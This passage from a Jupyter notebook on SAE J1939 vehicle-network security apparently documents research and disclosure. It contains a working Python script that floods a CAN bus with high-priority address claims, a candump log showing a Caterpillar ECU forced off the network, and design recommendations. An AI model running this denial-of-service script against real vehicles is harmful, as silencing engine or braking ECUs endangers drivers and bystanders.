      "b'\\xa5\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa6\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa7\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa8\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa9\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xaa\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xab\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xac\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xad\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xae\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xaf\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb0\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb1\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb2\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb3\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb4\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb5\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb6\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb7\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb8\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xb9\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xba\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xbb\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xbc\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xbd\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xbe\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xbf\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc0\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc1\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc2\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc3\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc4\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc5\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc6\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc7\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc8\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xc9\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xca\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xcb\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xcc\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xcd\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xce\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xcf\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd0\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd1\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd2\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd3\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd4\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd5\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd6\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd7\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd8\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xd9\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xda\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xdb\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xdc\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xdd\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xde\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xdf\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe0\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe1\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe2\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe3\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe4\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe5\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe6\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe7\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe8\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xe9\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xea\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xeb\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xec\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xed\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xee\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xef\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf0\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf1\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf2\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf3\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf4\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf5\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf6\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf7\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xf8\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xf9\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xfa\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xfb\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xfc\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "# Let's claim all the addresses with high priority NAMEs\n",
    "for sa in range(0,253): \n",
    "\n",
    "    can_id = 0x18EEFF00 + sa\n",
    "\n",
    "    #Set the extended frame format bit.\n",
    "    can_id |= socket.CAN_EFF_FLAG\n",
    "\n",
    "    # Make a high priority name\n",
    "    can_data = b'\\x00'*8\n",
    "\n",
    "    can_dlc = min(len(can_data),8)\n",
    "\n",
    "    can_packet = struct.pack(can_frame_format, can_id, can_dlc, can_data[:can_dlc] )\n",
    "    print(can_packet)\n",
    "\n",
    "    #Send out the CAN frame\n",
    "    sock.send(can_packet)\n",
    "    time.sleep(.1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "When connected to a CAT ECU, it starts with normal traffic, then the following transactions take place.\n",
    "The first line is a high priority address claim. Then the script marches through the output. Notes on the right side of the candump output annotate specific notes.\n",
    "```\n",
    "  can1  18EEFF00   [8]  00 00 00 00 00 00 00 00 - Initial high priority address claim\n",
    "  can1  18EEFF80   [8]  D0 6B 01 01 00 00 00 80 - Reclaim of a dynamic address\n",
    "  can1  18EEFF01   [8]  00 00 00 00 00 00 00 00 - move to the next address and claim it\n",
    "  can1  18EEFF02   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFF80   [8]  D0 6B 01 01 00 00 00 80 - The cat module repeat the claim on address 128\n",
    "  can1  18EEFFFE   [8]  01 02 03 01 00 0C 00 90 - The retarder sets the null address, so no address claimed.\n",
    "  can1  18EEFF03   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFF04   [8]  00 00 00 00 00 00 00 00\n",
    "  ...\n",
    "  can1  18EEFF7E   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFF7F   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFF80   [8]  00 00 00 00 00 00 00 00 - Claim the address 128\n",
    "  can1  18EEFF81   [8]  D0 6B 01 01 00 00 00 80 - The Cat reacts and claims 129\n",
    "  can1  18EEFF81   [8]  00 00 00 00 00 00 00 00 - Claim 129 away from the Cat\n",
    "  can1  18EEFF82   [8]  D0 6B 01 01 00 00 00 80 \n",
    "  can1  18EEFF82   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFF83   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFF83   [8]  00 00 00 00 00 00 00 00\n",
    "  ...\n",
    "  can1  18EEFFF4   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFFF5   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFFF5   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFFF6   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFFF6   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFFF7   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFFF7   [8]  00 00 00 00 00 00 00 00 - Claim the last available dynamically allocatable address\n",
    "  can1  18EEFFFE   [8]  D0 6B 01 01 00 00 00 80 - Cat claims the null address, it can't make a claim\n",
    "  can1  18EEFFF8   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFFF9   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFFFA   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFFFB   [8]  00 00 00 00 00 00 00 00\n",
    "  can1  18EEFFFC   [8]  00 00 00 00 00 00 00 00\n",
    "```\n",
    "At this point, the ECU stops all network transmission. It's stuck in the address claim loop. \n",
    "\n",
    "Therefore, it's fairly easly to deny service of an ecu that is compliant with SAE J1939-81.\n",
    "\n",
    "### Recommendation:\n",
    "Don't follow the SAE J1939-81 specifications if the messages from the ECU are important to the function of the system. For fixed configurations, like trucks, non-configurable addresses are prefered. Stopping network traffic voluntarily may not be a good design choice. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
